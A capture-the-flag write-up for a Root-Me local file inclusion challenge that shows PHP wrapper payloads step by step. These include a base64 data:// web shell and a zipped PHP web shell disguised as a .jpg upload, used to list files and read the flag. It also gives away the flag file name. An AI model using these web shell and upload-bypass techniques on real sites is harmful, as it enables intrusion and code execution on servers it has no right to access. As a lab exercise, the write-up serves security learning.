## Description
Retrieve the flag.
## Hints 
Abbreviated LFI
## Solution
First, let's follow thefollowing page:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers

#### Wrapper php://filter

 `/index.php?page=php://filter/convert.base64-encode/resource=index.php`

The page returned nothing.

#### Wrapper data://

 `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=`

The page return: **_page name too long_**

#### Wrapper expect://
 `index.php?page=expect://id`

![image](https://github.com/user-attachments/assets/192b48d3-0e8e-49c9-afac-ed431f0cde94)

#### Wrapper zip://

The page restricts the payload length, so I got the file name short. 

```php
echo "<pre><?php system($_GET['cmd']); ?></pre>" > p.php;
zip p.zip p.php;
mv p.zip a.jpg
```
Upload the archive and access the file using the following URL: `http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/aVK8jSdHa.jpg%23p`

![image](https://github.com/user-attachments/assets/0087c972-8fec-4902-aa2d-2deb97728314)

The `system()` function has been disabled, likely through the `disable_functions` directive in the php.ini configuration file. 

To bypass this restriction, I used another payload:
```php
echo "<pre><?php echo file_get_contents('index.php'); ?></pre>"
```
This returned the source code but nothing seemed to be the flag.

I then modified the PHP script to list all files in the directory, using a code snippet found in https://stackoverflow.com/questions/11457363/get-all-file-names-from-a-directory-in-php
```php
echo '<pre><?php 
$dir = "."; 
if ($handle = opendir($dir)) {
    while (false !== ($file = readdir($handle))) {
        echo $file . "<br>";
    }
    closedir($handle);
} 
?></pre>' > p.php;
zip p.zip p.php;
mv p.zip a.jpg
```
The page return a list of files:

![image](https://github.com/user-attachments/assets/003f0f64-ecdf-4d86-a4b2-c7cb0f40d002)

Then I modified the PHP script to read the contents of the flag file, I used the payload 

```php
echo '<pre><?php echo file_get_contents("flag-mipkBswUppqwXlq9ZydO.php"); ?></pre>'
``` 

and got the flag.




